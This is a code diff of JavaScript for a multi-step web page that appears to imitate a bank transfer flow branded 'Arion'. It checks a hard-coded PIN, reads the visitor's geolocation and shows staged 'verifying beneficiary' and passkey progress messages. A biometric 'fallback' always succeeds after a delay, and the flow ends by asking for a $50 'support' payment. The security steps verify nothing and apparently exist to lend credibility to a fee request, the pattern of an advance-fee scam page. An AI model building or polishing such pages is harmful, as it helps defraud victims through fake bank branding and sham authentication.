-  function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
-  function randLoad(min=MIN_LOAD,max=MAX_LOAD){ return new Promise(r=>setTimeout(r, Math.floor(Math.random()*(max-min+1))+min)); }
+  // Utilities
+  const delay = ms => new Promise(r => setTimeout(r, ms));
+  function scrollTo(el){ if(!el) return; el.scrollIntoView({behavior:'smooth',block:'start'}); }
 
   // PIN UX
-  function getPin(){ return inputs.map(i=>i.value||'').join(''); }
-  function clearPin(){ inputs.forEach(i=>i.value=''); try{inputs[0].focus()}catch(e){} }
-  inputs.forEach((el, idx)=>{
-    el.addEventListener('input', e=>{
+  function getPin(){ return ELEMENTS.pins.map(i=>i.value||'').join(''); }
+  function clearPin(){ ELEMENTS.pins.forEach(i=>i.value=''); try{ ELEMENTS.pins[0].focus(); } catch(e){} }
+
+  ELEMENTS.pins.forEach((el, idx)=>{
+    el.addEventListener('input', e => {
       const v = (e.target.value||'').replace(/\D/g,'').slice(0,1);
       e.target.value = v;
-      if (v && idx < inputs.length-1) inputs[idx+1].focus();
+      if (v && idx < ELEMENTS.pins.length-1) ELEMENTS.pins[idx+1].focus();
     });
-    el.addEventListener('keydown', e=>{
-      if (e.key === 'Backspace' && !el.value && idx>0) inputs[idx-1].focus();
-      if (e.key === 'Enter') attemptVerify();
+    el.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !el.value && idx>0) ELEMENTS.pins[idx-1].focus();
+      if (e.key === 'Enter') verifyPin();
     });
-    el.addEventListener('paste', e=>{
+    el.addEventListener('paste', e => {
       e.preventDefault();
       const pasted = (e.clipboardData||window.clipboardData).getData('text')||'';
       const digits = pasted.replace(/\D/g,'').slice(0,4).split('');
-      for(let k=0;k<digits.length;k++) if (inputs[k]) inputs[k].value = digits[k];
-      if (getPin().length===4) attemptVerify();
+      for(let k=0;k<digits.length;k++) if(ELEMENTS.pins[k]) ELEMENTS.pins[k].value = digits[k];
+      if (getPin().length===4) verifyPin();
     });
   });
-  verifyBtn.addEventListener('click', attemptVerify);
-  cancelBtn.addEventListener('click', clearPin);
 
-  async function attemptVerify(){
+  ELEMENTS.clearPinBtn.addEventListener('click', clearPin);
+
+  ELEMENTS.verifyPinBtn.addEventListener('click', verifyPin);
+
+  async function verifyPin(){
     const pin = getPin();
-    verifyBtn.disabled = true;
-    verifyBtn.textContent = 'Verifying…';
+    ELEMENTS.verifyPinBtn.disabled = true;
+    const orig = ELEMENTS.verifyPinBtn.textContent;
+    ELEMENTS.verifyPinBtn.textContent = 'Verifying…';
     await delay(600);
-    verifyBtn.disabled = false;
-    verifyBtn.textContent = 'Verify PIN';
+    ELEMENTS.verifyPinBtn.disabled = false;
+    ELEMENTS.verifyPinBtn.textContent = orig;
     if (pin === CORRECT_PIN){
       clearPin();
       startConnectFlow();
     } else {
-      flashError('Invalid PIN. Try again.');
+      flash(ELEMENTS.verifyPinBtn, 'Invalid PIN', 1400);
       clearPin();
     }
   }
-  function flashError(message){
-    const original = verifyBtn.textContent;
-    verifyBtn.textContent = message;
-    verifyBtn.style.background = 'linear-gradient(135deg,#ef4444,#f97316)';
-    verifyBtn.disabled = true;
-    setTimeout(()=>{ verifyBtn.textContent = original; verifyBtn.style.background=''; verifyBtn.disabled=false; }, 1400);
+
+  function flash(btn, message, ms=1400){
+    const orig = btn.textContent;
+    btn.textContent = message;
+    const origBg = btn.style.background;
+    btn.style.background = 'linear-gradient(135deg,#ef4444,#f97316)';
+    btn.disabled = true;
+    setTimeout(()=>{ btn.textContent = orig; btn.style.background = origBg; btn.disabled=false; }, ms);
   }
 
-  // Connect flow (uses img0163)
+  // Connect flow: detect location then enable authenticate step
   async function startConnectFlow(){
-    showView(views.connect);
-    // small zoom animation by toggling class
-    locationImg.classList.remove('zoom');
-    await delay(50);
-    locationImg.classList.add('zoom');
+    // open connect section visually
+    scrollTo(ELEMENTS.sections.connect);
+    ELEMENTS.connectMsg.textContent = 'Detecting device location…';
+    ELEMENTS.connectProgress.style.width = '8%';
 
-    connectStatus.textContent = 'Detecting device location';
-    connectProgress.style.width = '12%';
-
-    // start geolocation
-    detectLocation().catch(()=>{});
-
-    await delay(700);
-    connectStatus.textContent = 'Preparing secure settlement channel';
-    connectProgress.style.width = '36%';
-
-    await delay(900);
-    connectStatus.textContent = 'Verifying beneficiary & preparing receipt';
-    connectProgress.style.width = '66%';
-
-    await randLoad(1200, 1800);
-    connectProgress.style.width = '100%';
-    connectStatus.textContent = 'Finalizing…';
-    await delay(320);
-
-    showView(views.receipt);
-    revealReceipt();
-  }
-
-  // Geolocation
-  async function detectLocation(){
-    if (!navigator.geolocation){
-      locationText.textContent = 'Location unavailable';
-      locCoords.textContent = 'Unavailable';
-      return;
-    }
-    let done=false;
-    return new Promise(res=>{
-      navigator.geolocation.getCurrentPosition(pos=>{
-        if (done) return; done=true;
+    // location detection (best-effort)
+    if (navigator.geolocation){
+      let settled=false;
+      navigator.geolocation.getCurrentPosition(pos => {
+        if (settled) return; settled=true;
         const lat = pos.coords.latitude.toFixed(4);
         const lon = pos.coords.longitude.toFixed(4);
-        const acc = Math.round(pos.coords.accuracy);
-        locationText.textContent = `Device at ${lat}, ${lon} (±${acc}m)`;
-        locCoords.textContent = `${lat}, ${lon}`;
-        res();
-      }, err=>{
-        if (done) return; done=true;
-        locationText.textContent = 'Location access denied or unavailable.';
-        locCoords.textContent = 'Denied / Unknown';
-        res();
+        ELEMENTS.detectedLocation.textContent = `${lat}, ${lon}`;
+      }, err => {
+        if (settled) return; settled=true;
+        ELEMENTS.detectedLocation.textContent = 'Denied / Unavailable';
       }, {timeout:3500});
-      setTimeout(()=>{ if (!done){ done=true; locationText.textContent = 'Unable to determine precise location.'; locCoords.textContent = 'Unknown'; res(); } }, 4200);
-    });
-  }
-
-  // Receipt
-  function revealReceipt(){
-    receiverValue.textContent = BENEFICIARY;
-    feeValue.textContent = '$' + new Intl.NumberFormat().format(FEE_USD);
-    amountValue.textContent = '$' + new Intl.NumberFormat().format(AMOUNT_USD);
-    iskApprox.textContent = new Intl.NumberFormat().format(ISK_APPROX) + ' kr';
-  }
-  agreeCheckbox.addEventListener('change', ()=> confirmAgreeBtn.disabled = !agreeCheckbox.checked);
-  backToConnectBtn.addEventListener('click', ()=> showView(views.connect));
-
-  confirmAgreeBtn.addEventListener('click', async ()=>{
-    confirmAgreeBtn.disabled = true;
-    confirmAgreeBtn.textContent = 'Confirming…';
-    await randLoad();
-    confirmAgreeBtn.textContent = 'Confirmed';
-    await delay(420);
-    // Detect platform and show biometric popup view
-    detectPlatformForBiometric();
-    showView(views.biometric);
-  });
-
-  // Biometric detection
-  async function detectPlatformForBiometric(){
-    let available = false;
-    if (window.PublicKeyCredential && typeof PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable === 'function'){
-      try { available = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable(); } catch(e){ available=false; }
-    }
-    if (available){
-      bioStatus.textContent = 'Platform biometric available';
-      bioDetail.textContent = 'Your device should prompt for Face ID / fingerprint when requested.';
-      startBiometricBtn.textContent = 'Unlock with Biometrics';
+      // safety fallback
+      setTimeout(()=>{ if (!settled){ ELEMENTS.detectedLocation.textContent='Unknown'; } }, 4200);
     } else {
-      bioStatus.textContent = 'No platform biometric detected';
-      bioDetail.textContent = 'Native passkey not detected — a secure fallback will be used.';
-      startBiometricBtn.textContent = 'Use Secure Fallback';
+      ELEMENTS.detectedLocation.textContent = 'Unavailable';
     }
+
+    // staged progress
+    await delay(600);
+    ELEMENTS.connectProgress.style.width = '36%';
+    ELEMENTS.connectMsg.textContent = 'Preparing secure passkey activation…';
+    await delay(900);
+    ELEMENTS.connectProgress.style.width = '72%';
+    ELEMENTS.connectMsg.textContent = 'Verifying beneficiary information';
+    await delay(Math.floor(1200 + Math.random()*1200));
+    ELEMENTS.connectProgress.style.width = '100%';
+    ELEMENTS.connectMsg.textContent = 'Ready to authenticate';
+    // scroll to authenticate section
+    await delay(300);
+    scrollTo(ELEMENTS.sections.authenticate);
+    preparePlatformUI();
   }
 
-  // WebAuthn attempt (best-effort demo)
+  // Platform detection for friendly messaging
+  function isIOS(){ return /iPhone|iPad|iPod/i.test(navigator.userAgent) || (navigator.platform && /iPad|iPhone|iPod/.test(navigator.platform)); }
+  function isAndroid(){ return /Android/i.test(navigator.userAgent); }
+
+  function preparePlatformUI(){
+    if (isIOS()){
+      ELEMENTS.platformHint.textContent = 'Face ID (iOS) suggested';
+      ELEMENTS.platformDetail.textContent = 'Your device will request Face ID to authenticate the passkey activation.';
+      ELEMENTS.bioEmoji && (ELEMENTS.bioEmoji = null);
+    } else if (isAndroid()){
+      ELEMENTS.platformHint.textContent = 'Fingerprint (Android) suggested';
+      ELEMENTS.platformDetail.textContent = 'Your device will request fingerprint to authenticate the passkey activation.';
+    } else {
+      ELEMENTS.platformHint.textContent = 'Platform biometric recommended';
+      ELEMENTS.platformDetail.textContent = 'Device biometrics (Face ID or fingerprint) will be used when available.';
+    }
+    // clear previous logs
+    ELEMENTS.authLog && (ELEMENTS.authLog.textContent = '');
+  }
+
+  // WebAuthn attempt (best-effort)
   async function attemptWebAuthn(){
+    if (!window.PublicKeyCredential || typeof PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable !== 'function') {
+      return { success:false, reason:'Platform authenticator API unavailable' };
+    }
     try {
+      const available = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
+      if (!available) return { success:false, reason:'No platform authenticator available' };
+
+      // Create a dummy challenge for navigator.credentials.get() to attempt an interaction.
+      // Note: in production you must use server-generated challenge and registered credentials.
       const challenge = new Uint8Array(32);
       window.crypto.getRandomValues(challenge);
-      const publicKey = {
-        challenge: challenge,
-        timeout: 60000,
-        userVerification: 'required'
-      };
+      const publicKey = { challenge, timeout:60000, userVerification:'required' };
+
       const cred = await navigator.credentials.get({ publicKey });
-      return { success: true, credential: cred };
+      return { success:true, cred };
+    } catch (err){
+      return { success:false, reason: err && err.message ? err.message : String(err) };
+    }
+  }
+
+  // Start authentication click
+  ELEMENTS.startAuth.addEventListener('click', async () => {
+    ELEMENTS.startAuth.disabled = true;
+    ELEMENTS.startAuth.textContent = 'Authenticating…';
+    ELEMENTS.authLog.textContent = 'Attempting native authentication (WebAuthn)…';
+    try {
+      const res = await attemptWebAuthn();
+      if (res.success){
+        ELEMENTS.authLog.textContent = 'Native authentication succeeded.';
+        ELEMENTS.startAuth.textContent = 'Authenticated';
+        await delay(500);
+        // show payment section
+        revealPayment();
+      } else {
+        // fallback simulation
+        ELEMENTS.authLog.textContent = 'Native authentication unavailable: ' + (res.reason || 'unknown') + ' — using fallback';
+        ELEMENTS.startAuth.textContent = 'Fallback';
+        await delay(600);
+        await runFallbackAuth();
+      }
     } catch (err) {
-      return { success: false, error: err };
+      ELEMENTS.authLog.textContent = 'Authentication error — using fallback';
+      await runFallbackAuth();
+    } finally {
+      ELEMENTS.startAuth.disabled = false;
     }
+  });
+
+  ELEMENTS.skipAuth.addEventListener('click', () => {
+    // let user go back to previous seciton
+    scrollTo(document.getElementById('connect'));
+  });
+
+  async function runFallbackAuth(){
+    // Professional fallback: short confirmation UI flow
+    ELEMENTS.authLog.textContent = 'Performing secure fallback confirmation…';
+    await delay(900 + Math.floor(Math.random()*800));
+    ELEMENTS.authLog.textContent = 'Fallback confirmed.';
+    await delay(350);
+    revealPayment();
   }
 
-  // Start biometric
-  startBiometricBtn.addEventListener('click', async ()=>{
-    startBiometricBtn.disabled = true;
-    startBiometricBtn.textContent = 'Starting…';
-    bioStatus.textContent = 'Attempting authentication…';
-    const res = await attemptWebAuthn();
-    if (res.success){
-      bioStatus.textContent = 'Authentication successful';
-      startBiometricBtn.textContent = 'Authenticated';
-      await delay(600);
-      // After passkey enabled, show payment requirements with img0164 and "Authentication needed"
-      authStatusEl.textContent = 'Authentication needed';
-      supportAmountEl.textContent = '$' + new Intl.NumberFormat().format(SUPPORT_USD);
-      showView(views.authorize);
+  // Reveal payment section and enable pay button behavior
+  function revealPayment(){
+    scrollTo(ELEMENTS.sections.payment);
+    // ensure pay button state tied to checkbox
+    ELEMENTS.payBtn.classList.remove('disabled');
+    ELEMENTS.payBtn.setAttribute('aria-disabled','false');
+    // disable by default until checkbox is checked
+    togglePayButton();
+    ELEMENTS.payAgree.addEventListener('change', togglePayButton);
+  }
+
+  function togglePayButton(){
+    if (ELEMENTS.payAgree.checked){
+      ELEMENTS.payBtn.classList.remove('btn-ghost');
+      ELEMENTS.payBtn.classList.add('btn-primary');
+      ELEMENTS.payBtn.removeAttribute('disabled');
     } else {
-      console.warn('WebAuthn failed:', res.error);
-      bioStatus.textContent = 'Native prompt unavailable / failed — fallback';
-      startBiometricBtn.textContent = 'Fallback';
-      await delay(420);
-      // Show fallback interactive confirmation
-      showFallbackBiometric();
+      ELEMENTS.payBtn.classList.remove('btn-primary');
+      ELEMENTS.payBtn.classList.add('btn-ghost');
+      ELEMENTS.payBtn.setAttribute('disabled','');
     }
-  });
-
-  cancelBiometricBtn.addEventListener('click', ()=> showView(views.receipt));
-
-  // Fallback (professional simulation)
-  async function showFallbackBiometric(){
-    const bioTitle = document.getElementById('bioTitle');
-    const bioDesc = document.getElementById('bioDesc');
-    bioTitle.textContent = 'Fallback Device Confirmation';
-    bioDesc.textContent = 'Touch your fingerprint sensor, use Face ID, or press Confirm to proceed with a secure fallback.';
-    const popup = document.getElementById('biometricPopup');
-    const actions = popup.querySelector('.bio-actions');
-    actions.innerHTML = '';
-    const confirmBtn = document.createElement('button');
-    confirmBtn.className = 'btn btn-primary';
-    confirmBtn.textContent = 'Simulate Biometric';
-    const manualBtn = document.createElement('button');
-    manualBtn.className = 'btn btn-ghost';
-    manualBtn.textContent = 'Confirm Manually';
-    actions.appendChild(manualBtn);
-    actions.appendChild(confirmBtn);
-
-    confirmBtn.addEventListener('click', async ()=>{
-      confirmBtn.disabled = true;
-      confirmBtn.textContent = 'Authenticating…';
-      bioStatus.textContent = 'Simulating biometric…';
-      await randLoad(800, 1400);
-      bioStatus.textContent = 'Authentication successful';
-      await delay(420);
-      // show payment authorization
-      authStatusEl.textContent = 'Authentication needed';
-      supportAmountEl.textContent = '$' + new Intl.NumberFormat().format(SUPPORT_USD);
-      showView(views.authorize);
-    });
-
-    manualBtn.addEventListener('click', async ()=>{
-      manualBtn.disabled = true;
-      manualBtn.textContent = 'Confirming…';
-      bioStatus.textContent = 'Manual confirmation accepted';
-      await randLoad(600, 1200);
-      authStatusEl.textContent = 'Authentication needed';
-      supportAmountEl.textContent = '$' + new Intl.NumberFormat().format(SUPPORT_USD);
-      showView(views.authorize);
-    });
   }
 
-  // Authorize $50 payment (img0164 displayed already in authorize view)
-  authorizeKeyBtn.addEventListener('click', async ()=>{
-    authorizeKeyBtn.disabled = true;
-    authorizeKeyBtn.textContent = 'Authorizing…';
-    await randLoad();
-    const txId = 'ARION-' + Math.random().toString(36).slice(2,9).toUpperCase();
-    txIdEl.textContent = txId;
-    showView(views.success);
-  });
-  backFromAuthorizeBtn.addEventListener('click', ()=> {
-    // go back to biometric view for re-authentication
-    detectPlatformForBiometric();
-    showView(views.biometric);
+  // back button on payment goes back to authenticate section
+  ELEMENTS.payBack.addEventListener('click', () => {
+    scrollTo(ELEMENTS.sections.authenticate);
   });
 
-  // Done button resets demo
-  document.getElementById('doneBtn').addEventListener('click', ()=> {
-    agreeCheckbox.checked = false;
-    confirmAgreeBtn.disabled = true;
-    showView(views.pin);
-  });
-
-  // Init on load
+  // init: scroll top and prepare
   (function init(){
-    amountValue.textContent = '$' + new Intl.NumberFormat().format(AMOUNT_USD);
-    iskApprox.textContent = new Intl.NumberFormat().format(ISK_APPROX) + ' kr';
-    feeValue.textContent = '$' + new Intl.NumberFormat().format(FEE_USD);
-    receiverValue.textContent = BENEFICIARY;
-    supportAmountEl.textContent = '$' + new Intl.NumberFormat().format(SUPPORT_USD);
-    try{ inputs[0].focus(); } catch(e){}
+    // set initial text and values
+    ELEMENTS.detectedLocation.textContent = 'Detecting…';
+    document.getElementById('payAmount').textContent = '$50';
+    document.getElementById('payReceiver').textContent = 'Support — Arion Keychain';
+    // ensure pay button disabled until agreement
+    ELEMENTS.payBtn.setAttribute('disabled','');
+    // if page loaded with anchor, let browser handle scroll
+    window.scrollTo({top:0});
   })();
 
 })();
